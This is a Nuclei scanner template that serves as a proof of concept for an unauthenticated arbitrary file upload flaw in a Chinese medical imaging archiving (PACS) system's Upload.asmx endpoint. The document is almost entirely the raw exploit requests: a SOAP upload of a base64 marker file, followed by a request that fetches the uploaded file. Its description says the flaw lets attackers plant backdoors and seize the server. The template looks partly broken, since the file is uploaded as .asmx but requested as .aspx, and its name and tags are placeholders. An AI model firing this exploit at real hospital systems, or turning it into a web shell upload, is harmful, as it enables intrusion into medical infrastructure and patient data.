pocs/nuclei/yfd-webservices-upload.yaml

id: yfd-webservices-upload
info:
  name: Template Name
  author: wangzong
  severity: critical
  description: 英飞达医学影像存档与通信系统Upload.asmx 接口任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
  reference:
    - https://github.com/wy876/POC/blob/38c637c345afb250de493919c954bdb15b8fe060/%E8%8B%B1%E9%A3%9E%E8%BE%BE%E5%8C%BB%E5%AD%A6%E5%BD%B1%E5%83%8F%E5%AD%98%E6%A1%A3%E4%B8%8E%E9%80%9A%E4%BF%A1%E7%B3%BB%E7%BB%9FUpload.asmx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
  tags: tags
variables:
  filename: "{{rand_base(6)}}"   
http:
  - raw:
      - |-
        POST /webservices/Upload.asmx HTTP/1.1
        Host: {{Hostname}}
        SOAPAction: "http://tempuri.org/UploadData"
        Connection: close
        Content-Length: 1128

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
        <soap:Body>
        <UploadData xmlns="http://tempuri.org/">
        <guid>1</guid>
        <patientId>1</patientId>
        <patientName>1</patientName>
        <fileName>{{filename}}.asmx</fileName>
        <fileSize>1000</fileSize>
        <file>d2hvaXNjZXNoaQ==</file>
        </UploadData>
        </soap:Body>
        </soap:Envelope>
      - |+
        GET //spool/1/{{filename}}.aspx HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: word
        part: body
        words:
          - 'whoisceshi'
